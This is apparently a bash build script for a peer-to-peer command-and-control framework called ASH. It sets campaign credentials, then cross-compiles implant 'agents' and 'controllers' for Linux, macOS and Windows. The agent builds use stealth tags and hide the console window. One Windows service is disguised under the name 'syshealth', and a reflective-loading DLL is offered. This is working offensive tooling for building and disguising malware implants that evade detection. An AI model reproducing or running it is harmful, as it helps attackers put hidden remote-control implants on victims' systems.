#!/bin/bash

# P2P C2 Build Automation Script
# Usage: ./build.sh

set -e

# Professional color scheme
GRAY='\033[0;37m'
DARK_GRAY='\033[0;90m'
WHITE='\033[1;37m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[0;33m'
NC='\033[0m'

# Banner
echo -e "${BLUE}"
cat << "EOF"
       _
      ( \
       \ \
       / /                |\\
      / /     .-`````-.   / ^`-.
      \ \    /         \_/  {|} `o
       \ \  /   .---.   \\ _  ,--'
        \ \/   /     \,  \( `^^^
         \   \/\      (\  )
          \   ) \     ) \ \
      ASH  ) /__ \__  ) (\ \___
          (___)))__))(__))(__)))
          Build Generator_________

EOF
echo -e "${NC}\n"

# Check if main.go exists
if [ ! -f "main.go" ]; then
    echo -e "${RED}[ERROR]${NC} main.go not found"
    echo -e "${DARK_GRAY}Please run this script in the project root directory${NC}"
    exit 1
fi

# Get campaign credentials
echo -e "${WHITE}Room Configuration Build${NC}"
echo -e "${DARK_GRAY}────────────────────────────────────────────────────────────────────${NC}"
echo -n "Room Name [default: myr00mpublic]: "
read ROOM
ROOM=${ROOM:-myr00mpublic}

echo -n "Password [default: MyR00mpass]: "
read PASS
PASS=${PASS:-MyR00mpass}

echo -e "\n${GREEN}[OK]${NC} Room: ${CYAN}$ROOM${NC}"
echo -e "${GREEN}[OK]${NC} Pass: ${CYAN}$PASS${NC}\n"

# Backup main.go
if [ ! -f "main.go.bak" ]; then
    cp main.go main.go.bak
    echo -e "${GREEN}[OK]${NC} Backup created: main.go.bak"
fi

# Update main.go with new credentials
echo -e "${BLUE}[INFO]${NC} Updating credentials in main.go"
sed -i.tmp "s/DefaultRoom = \".*\"/DefaultRoom = \"$ROOM\"/" main.go
sed -i.tmp "s/DefaultPass = \".*\"/DefaultPass = \"$PASS\"/" main.go
rm -f main.go.tmp
echo -e "${GREEN}[OK]${NC} Credentials updated\n"

# Build target selection - AGENT
echo -e "${WHITE}Agent Build Configuration${NC}"
echo -e "${DARK_GRAY}────────────────────────────────────────────────────────────────────${NC}"
echo "1. Current OS only"
echo "2. Linux (amd64)"
echo "3. Linux (arm64)"
echo "4. macOS (amd64)"
echo "5. macOS (arm64 / M1/M2)"
echo "6. Windows (amd64)"
echo "7. Windows DLL (amd64) [Reflective]"
echo "8. All platforms"
echo "9. Multiple selection"
echo "10. Skip agent build"
echo
echo -n "Select option [1-10]: "
read AGENT_BUILD_OPTION

# Build target selection - CONTROLLER
echo -e "\n${WHITE}Controller Build Configuration${NC}"
echo -e "${DARK_GRAY}────────────────────────────────────────────────────────────────────${NC}"
echo "1. Current OS only"
echo "2. Linux (amd64)"
echo "3. Linux (arm64)"
echo "4. macOS (amd64)"
echo "5. macOS (arm64 / M1/M2)"
echo "6. Windows (amd64)"
echo "7. All platforms"
echo "8. Multiple selection"
echo "9. Skip controller build"
echo
echo -n "Select option [1-9]: "
read CONTROLLER_BUILD_OPTION

# Create build directory
BUILD_DIR="build"
mkdir -p $BUILD_DIR
echo -e "\n${GREEN}[OK]${NC} Build directory: ${CYAN}$BUILD_DIR${NC}\n"

# Build flags
LDFLAGS="-s -w"

# Build function
build_binary() {
    local GOOS=$1
    local GOARCH=$2
    local TARGET=$3
    local BINARY_NAME=$4
    local TAGS=$5
    
    echo -e "${BLUE}[BUILD]${NC} $TARGET"
    
    local OUTPUT_FILE="$BUILD_DIR/${BINARY_NAME}-${GOOS}-${GOARCH}"
    
    local BIN_LDFLAGS="$LDFLAGS"

    # Add suffix for stealth
    if [[ "$TAGS" == *"stealth"* ]]; then
        OUTPUT_FILE="${OUTPUT_FILE}-stealth"
    fi

    # Add .exe for Windows and Stealth flag
    if [ "$GOOS" == "windows" ]; then
        OUTPUT_FILE="${OUTPUT_FILE}.exe"
        # Add GUI flag to hide console
        BIN_LDFLAGS="$BIN_LDFLAGS -H=windowsgui"
    fi
    
    local BUILD_CMD="GOOS=$GOOS GOARCH=$GOARCH go build"
    
    if [ -n "$TAGS" ]; then
        BUILD_CMD="$BUILD_CMD -tags=$TAGS"
    fi
    
    BUILD_CMD="$BUILD_CMD -ldflags=\"$BIN_LDFLAGS\" -o \"$OUTPUT_FILE\""
    
    # Execute build
    eval $BUILD_CMD 2>&1
    
    local BUILD_STATUS=$?
    
    if [ $BUILD_STATUS -eq 0 ] && [ -f "$OUTPUT_FILE" ]; then
        local SIZE=$(ls -lh "$OUTPUT_FILE" | awk '{print $5}')
        echo -e "${GREEN}[OK]${NC} ${CYAN}$(basename $OUTPUT_FILE)${NC} ${DARK_GRAY}($SIZE)${NC}"
        return 0
    else
        echo -e "${RED}[FAIL]${NC} $TARGET"
        echo -e "${DARK_GRAY}       Build exit code: $BUILD_STATUS${NC}"
        
        # Retry verbose
        echo -e "${YELLOW}[WARN]${NC} Retrying with verbose output"
        eval "$BUILD_CMD -v"
        return 1
    fi
}

# Build AGENT based on selection
echo -e "${WHITE}Building Agents${NC}"
echo -e "${DARK_GRAY}────────────────────────────────────────────────────────────────────${NC}\n"

case $AGENT_BUILD_OPTION in
    1)
        build_binary $(go env GOOS) $(go env GOARCH) "Current OS Agent" "agent"
        ;;
    2)
        build_binary "linux" "amd64" "Linux amd64 Agent (Normal)" "agent"
        build_binary "linux" "amd64" "Linux amd64 Agent (Stealth)" "agent" "stealth"
        ;;
    3)
        build_binary "linux" "arm64" "Linux arm64 Agent (Normal)" "agent"
        build_binary "linux" "arm64" "Linux arm64 Agent (Stealth)" "agent" "stealth"
        ;;
    4)
        build_binary "darwin" "amd64" "macOS amd64 Agent" "agent"
        ;;
    5)
        build_binary "darwin" "arm64" "macOS arm64 Agent" "agent"
        ;;
    6)
        build_binary "windows" "amd64" "Windows amd64 Agent (Stealth Service)" "syshealth"
        build_binary "windows" "amd64" "Windows amd64 Agent (Normal)" "agent" "noservice"
        ;;
    7)
        # Build DLL
        echo -e "${BLUE}[BUILD]${NC} Windows DLL (Reflective)"
        # Check for MinGW
        if command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then
            CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 go build -buildmode=c-shared -ldflags "-s -w" -o "$BUILD_DIR/agent_windows_amd64.dll" .
            if [ $? -eq 0 ]; then
                echo -e "${GREEN}[OK]${NC} agent_windows_amd64.dll"
            else
                echo -e "${RED}[FAIL]${NC} agent_windows_amd64.dll"
            fi
        else
            echo -e "${RED}[ERROR]${NC} MinGW compiler (x86_64-w64-mingw32-gcc) not found. Cannot build DLL."
        fi
        ;;
    8)
        build_binary "linux" "amd64" "Linux amd64 Agent (Normal)" "agent"
        build_binary "linux" "amd64" "Linux amd64 Agent (Stealth)" "agent" "stealth"
        build_binary "linux" "arm64" "Linux arm64 Agent (Normal)" "agent"
        build_binary "linux" "arm64" "Linux arm64 Agent (Stealth)" "agent" "stealth"
        build_binary "darwin" "amd64" "macOS amd64 Agent" "agent"
        build_binary "darwin" "arm64" "macOS arm64 Agent" "agent"
        build_binary "windows" "amd64" "Windows amd64 Agent" "agent"
        ;;
    9)
        echo "Select targets (space-separated numbers):"
        echo "1) Linux amd64   2) Linux arm64"
        echo "3) macOS amd64   4) macOS arm64"
        echo "5) Windows amd64 6) Windows DLL"
        echo -n "Agent targets: "
        read -a AGENT_TARGETS
        echo
        
        for target in "${AGENT_TARGETS[@]}"; do
            case $target in
                1) 
                    build_binary "linux" "amd64" "Linux amd64 Agent (Normal)" "agent" 
                    build_binary "linux" "amd64" "Linux amd64 Agent (Stealth)" "agent" "stealth"
                    ;;
                2) 
                    build_binary "linux" "arm64" "Linux arm64 Agent (Normal)" "agent" 
                    build_binary "linux" "arm64" "Linux arm64 Agent (Stealth)" "agent" "stealth"
                    ;;
                3) build_binary "darwin" "amd64" "macOS amd64 Agent" "agent" ;;
                4) build_binary "darwin" "arm64" "macOS arm64 Agent" "agent" ;;
                5) 
                    build_binary "windows" "amd64" "Windows amd64 Agent (Stealth Service)" "syshealth"
                    build_binary "windows" "amd64" "Windows amd64 Agent (Normal)" "agent" "noservice"
                    ;;
                6) 
                    echo -e "${BLUE}[BUILD]${NC} Windows DLL (Reflective)"
                    if command -v x86_64-w64-mingw32-gcc >/dev/null 2>&1; then
                        CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc GOOS=windows GOARCH=amd64 go build -buildmode=c-shared -ldflags "-s -w" -o "$BUILD_DIR/syshealth.dll" .
                    else
                        echo -e "${RED}[ERROR]${NC} MinGW compiler not found"
                    fi
                    ;;
            esac
        done
        ;;
    10)
        echo -e "${DARK_GRAY}[SKIP]${NC} Agent build skipped\n"
        ;;
    *)
        echo -e "${RED}[ERROR]${NC} Invalid option"
        exit 1
        ;;
esac

# Build CONTROLLER based on selection
echo -e "\n${WHITE}Building Controllers${NC}"
echo -e "${DARK_GRAY}────────────────────────────────────────────────────────────────────${NC}\n"

case $CONTROLLER_BUILD_OPTION in
    1)
        build_binary $(go env GOOS) $(go env GOARCH) "Current OS Controller" "controller" "controller"
        ;;
    2)
        build_binary "linux" "amd64" "Linux amd64 Controller" "controller" "controller"
        ;;
    3)
        build_binary "linux" "arm64" "Linux arm64 Controller" "controller" "controller"
        ;;
    4)
        build_binary "darwin" "amd64" "macOS amd64 Controller" "controller" "controller"
        ;;
    5)
        build_binary "darwin" "arm64" "macOS arm64 Controller" "controller" "controller"
        ;;
    6)
        build_binary "windows" "amd64" "Windows amd64 Controller" "controller" "controller"
        ;;
    7)
        build_binary "linux" "amd64" "Linux amd64 Controller" "controller" "controller"
        build_binary "linux" "arm64" "Linux arm64 Controller" "controller" "controller"
        build_binary "darwin" "amd64" "macOS amd64 Controller" "controller" "controller"
        build_binary "darwin" "arm64" "macOS arm64 Controller" "controller" "controller"
        build_binary "windows" "amd64" "Windows amd64 Controller" "controller" "controller"
        ;;
    8)
        echo "Select targets (space-separated numbers):"
        echo "1) Linux amd64   2) Linux arm64"
        echo "3) macOS amd64   4) macOS arm64"
        echo "5) Windows amd64"
        echo -n "Controller targets: "
        read -a CONTROLLER_TARGETS
        echo
        
        for target in "${CONTROLLER_TARGETS[@]}"; do
            case $target in
                1) build_binary "linux" "amd64" "Linux amd64 Controller" "controller" "controller" ;;
                2) build_binary "linux" "arm64" "Linux arm64 Controller" "controller" "controller" ;;
                3) build_binary "darwin" "amd64" "macOS amd64 Controller" "controller" "controller" ;;
                4) build_binary "darwin" "arm64" "macOS arm64 Controller" "controller" "controller" ;;
                5) build_binary "windows" "amd64" "Windows amd64 Controller" "controller" "controller" ;;
            esac
        done
        ;;
    9)
        echo -e "${DARK_GRAY}[SKIP]${NC} Controller build skipped\n"
        ;;
    *)
        echo -e "${RED}[ERROR]${NC} Invalid option"
        exit 1
        ;;
esac


# Auto-restore main.go
echo -e "\n${BLUE}[INFO]${NC} Restoring original main.go"
if [ -f "main.go.bak" ]; then
    mv main.go.bak main.go
    echo -e "${GREEN}[OK]${NC} main.go restored from backup\n"
else
    echo -e "${YELLOW}[WARN]${NC} Backup file not found\n"
fi

# Summary
echo -e "${BLUE}"
cat << "EOF"
  
                    Build Complete                            
EOF
echo -e "${NC}\n"

echo -e "${WHITE}Build Artifacts${NC}"
echo -e "${DARK_GRAY}────────────────────────────────────────────────────────────────────${NC}"
ls -lh $BUILD_DIR/ | tail -n +2 | while read line; do
    echo -e "${DARK_GRAY}  $line${NC}"
done

echo -e "\n${WHITE}Campaign Information${NC}"
echo -e "${DARK_GRAY}────────────────────────────────────────────────────────────────────${NC}"
echo -e "  Room: ${CYAN}$ROOM${NC}"
echo -e "  Pass: ${CYAN}$PASS${NC}"

echo -e "\n${DARK_GRAY}Build completed successfully${NC}\n"